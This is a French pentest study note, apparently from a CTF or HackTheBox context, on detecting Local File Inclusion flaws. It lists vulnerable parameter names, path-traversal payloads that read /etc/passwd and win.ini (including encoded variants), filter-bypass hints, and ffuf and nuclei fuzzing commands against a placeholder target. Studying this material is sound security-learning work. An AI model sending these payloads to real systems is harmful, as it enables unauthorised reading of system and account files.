---
titre: "LFI — 1 - Repérage"
tags: [Failles, LFI, reconnaissance]
---

# LFI — 1. Repérage

> ⬅ [[LFI - Index]]

## Où chercher : les paramètres suspects
Tout paramètre dont la valeur ressemble à un **nom de fichier / chemin / page** :
```
?file=   ?page=   ?include=   ?template=   ?lang=   ?doc=   ?path=
?view=   ?content=   ?download=   ?img=   ?theme=   ?pdf=
/api/download/<filename>        # aussi dans le path, pas que la query
```
Indices : extension visible (`?page=home.php`), langue (`?lang=fr`), un
téléchargement, un aperçu de document.

## Test de confirmation (par ordre)
```bash
# 1) le fichier de référence universel
?file=/etc/passwd
?file=../../../../../../etc/passwd
?file=..%2f..%2f..%2f..%2fetc%2fpasswd        # encodé (souvent nécessaire)

# 2) Windows
?file=C:\windows\win.ini
?file=..\..\..\..\windows\win.ini

# 3) si l'app ajoute une extension (?page=X -> X.php), tester le chemin relatif interne
?page=index                    # charge index.php -> confirme l'inclusion
```
Succès = contenu de `/etc/passwd` (`root:x:0:0:...`) ou de `win.ini`.

## Lire les signaux d'erreur
Les messages fuient le comportement du code :
```
"failed to open stream: No such file or directory"  → include() PHP, chemin contrôlé ✅
"...in /var/www/html/index.php on line 12"           → chemin absolu de l'app (utile)
"File not found!"                                     → mesurer sa taille pour ffuf -fs
```

## Détecter le filtrage
Comparer les réponses pour deviner la protection :
- `../` supprimé une seule fois → tester `....//` (voir [[3 - Payloads & bypass (LFI)]]).
- extension forcée (`.php` ajouté) → wrapper `php://filter` ou null-byte (vieux PHP).
- caractères bloqués → encodage / double-encodage.

## Fuzzing (trouver le paramètre / les fichiers)
```bash
# paramètre caché
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u 'http://CIBLE/?FUZZ=/etc/passwd' -fs <taille_reponse_vide>

# fichiers sensibles connus (mesurer d'abord la taille d'une erreur -> -fs)
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u 'http://CIBLE/api/download/FUZZ' -fs <TAILLE_ERREUR>

# automatisation
nuclei -u 'http://CIBLE/?file=' -tags lfi,traversal
```
Réflexe : `/etc/passwd` **en premier** (confirme la LFI ET énumère les utilisateurs :
UID ≥ 1000 = comptes humains, shell `/bin/bash` = compte utilisable).

Exemple vécu (API HTB, traversal encodé obligatoire) : voir
[[2 - Exploitation & techniques (LFI)]].
